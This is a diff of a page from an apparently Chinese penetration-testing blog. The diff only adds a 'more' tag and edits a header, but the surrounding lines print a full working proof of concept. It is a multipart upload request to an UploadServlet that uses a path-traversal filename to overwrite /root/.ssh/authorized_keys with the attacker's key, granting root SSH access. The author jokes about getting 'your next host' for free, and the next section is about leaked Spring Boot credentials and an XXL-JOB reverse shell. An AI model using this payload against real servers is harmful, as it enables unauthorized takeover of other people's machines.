@@ -748,6 +748,8 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa </span><br><span class="line">cat /root/.ssh/id_rsa.pub    #可以拿来用啦</span><br></pre></td></tr></table></figure>
 
 <p>poc如下：</p>
+<span id="more"></span>
+
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /upload/UploadServlet HTTP/1.1</span><br><span class="line">Content-Length: 1283</span><br><span class="line">Content-Type: multipart/form-data; boundary=8mR-ztMG5r-q5b7yp-IaAs20oaFQVH</span><br><span class="line">Host: 码码码码码码码码码码码码码码</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line"></span><br><span class="line">--8mR-ztMG5r-q5b7yp-IaAs20oaFQVH</span><br><span class="line">Content-Disposition: form-data; name=&quot;access_token&quot;</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line"></span><br><span class="line">5d64e94b10e14025a234c4f6870c38e0</span><br><span class="line">--8mR-ztMG5r-q5b7yp-IaAs20oaFQVH</span><br><span class="line">Content-Disposition: form-data; name=&quot;validTime&quot;</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line"></span><br><span class="line">1.0</span><br><span class="line">--8mR-ztMG5r-q5b7yp-IaAs20oaFQVH</span><br><span class="line">Content-Disposition: form-data; name=&quot;userId&quot;</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line"></span><br><span class="line">10002341</span><br><span class="line">--8mR-ztMG5r-q5b7yp-IaAs20oaFQVH</span><br><span class="line">Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;../../../../../../../../../../../../../../../../../../../root/.ssh/authorized_keys&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">Content-Transfer-Encoding: binary</span><br><span class="line"></span><br><span class="line">ssh-rsa AAAAB3NzaC此处是自己这边生成的密钥文件，上传这个authorized_keys可轻松实现免密登录LbGM= root@kali</span><br></pre></td></tr></table></figure>
 
 <p>但是想要扒拉东西的话，这样很慢，上winscp免密登录比较好一些</p>
@@ -755,7 +757,7 @@
 <p>你的下一台主机，何必花钱是买来的？（狗头保命）</p>
 <p>这个是有一定概率不成功的，比如根本没这个目录、比如根本没开这个端口、比如权限问题等等</p>
 <p>大部分还是能成的</p>
-<h2 id="日常2-springboot信息泄露-redis未授权-XXL-JOB反弹shell"><a href="#日常2-springboot信息泄露-redis未授权-XXL-JOB反弹shell" class="headerlink" title="日常2  springboot信息泄露+redis未授权+XXL-JOB反弹shell"></a>日常2  springboot信息泄露+redis未授权+XXL-JOB反弹shell</h2><p>32位的弱口令泄露 爱来自/env目录 </p>
+<h2 id="日常2-springboot信息泄露-XXL-JOB反弹shell"><a href="#日常2-springboot信息泄露-XXL-JOB反弹shell" class="headerlink" title="日常2  springboot信息泄露+XXL-JOB反弹shell"></a>日常2  springboot信息泄露+XXL-JOB反弹shell</h2><p>32位的弱口令泄露 爱来自/env目录 </p>
 <p>登上去后搜到了Redis和MySQL数据库密码</p>
 <p><img src="/2023/08/02/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98%E6%97%A5%E5%B8%B8/1.png"></p>
 <p>32位，看起来很复杂，对8？在复杂他也是弱口令</p>
